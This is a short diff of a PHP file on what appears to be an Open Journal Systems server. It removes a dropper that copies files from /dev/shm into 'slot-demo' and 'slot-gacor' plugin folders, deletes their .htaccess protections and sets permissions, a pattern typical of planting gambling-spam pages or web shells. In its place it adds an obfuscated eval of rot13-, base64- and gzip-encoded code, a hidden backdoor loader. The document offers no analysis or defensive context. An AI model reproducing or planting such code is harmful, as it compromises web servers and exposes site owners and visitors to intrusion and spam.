@@ -1,20 +1,3 @@
 <?php
-$filea = '/dev/shm/var.log';
-$lpa = '/var/www/html/ojs-a/plugins/slot-demo/index.php';
-$fileb = '/dev/shm/readme.log';
-$lpb = '/var/www/html/ojs-a/plugins/slot-gacor/index.php';
-$dir = '/var/www/html/ojs-a/plugins/slot-demo/';
-$dira = '/var/www/html/ojs-a/plugins/slot-gacor/';
-$ht = '/var/www/html/ojs-a/plugins/slot-demo/.htaccess';
-$hta = '/var/www/html/ojs-a/plugins/slot-gacor/.htaccess';
-copy($filea, $lpa);
-copy($fileb, $lpb);
-mkdir("/var/www/html/ojs-a/plugins/slot-demo/");
-mkdir("/var/www/html/ojs-a/plugins/slot-gacor/");
-unlink($ht);
-unlink($hta);
-chmod($dir, 0755);
-chmod($$dira, 0755);
-chmod($lpa, 0644);
-chmod($lpb, 0644);
+eval(gzuncompress(base64_decode(str_rot13('rWlIxp0BjvNDuB8+EJAZJuCgreO68XsCNtHYPbJH/hwoP8Ib64xr+pwZmhlrp830LaKwtdYbRfINnNrTFruDaDcIkdsSFzw/MEU0sD+fxDYH3JjEnATJiQWtuTd2uRbSiPY0zIcGc3F2rTWoH0Dx/GawVBpFSndrJuAru4s6PZWd+TSBjcejRFyeHSSDL7kjmdvkgSQ6ysumoPX3+sJL4LSul+GQ9xzJLqzJZjD+xyB0yrQIV7SyWb8uRMBXWT6yz2u3mYVsTgo8Q20Avj77/EwuY8diom941Vx='))));
 ?>
